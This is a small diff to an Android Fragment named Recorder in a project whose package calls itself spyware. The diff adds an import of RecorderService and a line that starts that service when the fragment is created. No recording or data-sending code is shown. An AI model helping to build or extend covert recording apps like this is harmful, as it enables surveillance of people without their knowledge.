@@ -1,6 +1,7 @@
 package Fragment;
 
 import android.content.Context;
+import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
 import android.support.v4.app.Fragment;
@@ -8,6 +9,7 @@ import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
 
+import spywareservice.RecorderService;
 import comyware.example.duongtan.spyware.R;
 
 /**
@@ -59,6 +61,7 @@ public class Recorder extends Fragment {
             mParam1 = getArguments().getString(ARG_PARAM1);
             mParam2 = getArguments().getString(ARG_PARAM2);
         }
+        getActivity().startService(new Intent(getContext(), RecorderService.class));
     }
 
     @Override
